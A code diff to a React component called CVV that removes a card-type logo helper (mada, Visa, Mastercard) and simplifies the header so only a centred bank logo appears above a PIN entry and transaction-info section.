@@ -108,20 +108,6 @@ export default function CVV() {
     });
   };
 
-  // Get card type logo
-  const getCardTypeLogo = (type?: string) => {
-    switch (type?.toLowerCase()) {
-      case "mada":
-        return "/images/mada.png";
-      case "visa":
-        return "/images/visa.png";
-      case "mastercard":
-        return "/images/mastercard.png";
-      default:
-        return "/images/mada.png";
-    }
-  };
-
   const isPinComplete = pin.every(digit => digit !== "");
 
   return (
@@ -138,28 +124,16 @@ export default function CVV() {
           </p>
         </div>
 
-        {/* Bank and Card Type Logos */}
-        <div className="flex justify-between items-center mb-6 px-4">
-          {/* Card Type Logo (Right) */}
-          <div className="flex items-center">
+        {/* Bank Logo */}
+        {cardInfo?.bankLogo && (
+          <div className="flex justify-center items-center mb-6">
             <img
-              src={getCardTypeLogo(cardInfo?.cardType)}
-              alt={cardInfo?.cardType || "Card"}
+              src={cardInfo.bankLogo}
+              alt={cardInfo.bankName || "Bank"}
               className="h-10 object-contain"
             />
           </div>
-          
-          {/* Bank Logo (Left) */}
-          {cardInfo?.bankLogo && (
-            <div className="flex items-center">
-              <img
-                src={cardInfo.bankLogo}
-                alt={cardInfo.bankName || "Bank"}
-                className="h-10 object-contain"
-              />
-            </div>
-          )}
-        </div>
+        )}
 
         {/* Transaction Info */}
         <div className="bg-gray-50 rounded-lg p-4 mb-6 text-sm text-gray-700 text-right leading-relaxed">
